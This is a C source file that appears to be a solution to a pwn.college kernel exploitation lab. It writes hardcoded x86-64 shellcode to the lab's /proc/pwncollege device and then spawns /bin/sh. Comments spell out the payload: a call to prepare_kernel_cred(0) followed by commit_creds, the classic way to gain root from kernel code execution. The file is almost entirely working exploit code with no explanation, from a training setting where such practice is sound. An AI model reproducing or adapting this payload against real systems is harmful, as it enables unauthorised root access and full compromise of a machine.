#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<assert.h>
int main(){


    int fd ;
    // shell code
    // xor rdi, rdi
    // mov rbx, {prepare_kernel_cred}
    // call rbx
    // mov rdi, rax
    // mov rbx, {commit_creds}
    // call rbx
    // ret
    char shell[] = "H1\xffH\xc7\xc3\xc0\x90\x08\x81\xff\xd3H\x89\xc7H\xc7\xc3\x80\x8d\x08\x81\xff\xd3\xc3";
    fd = open("/proc/pwncollege",2);
    assert(fd >0);
    //write(fd,ans,sizeof(ans));
    //read(fd,buffer,100);
    //printf("%s",buffer);
    write(fd,shell,0x100);
    execl("/bin/sh","/bin/sh",0);
    return 0 ;
}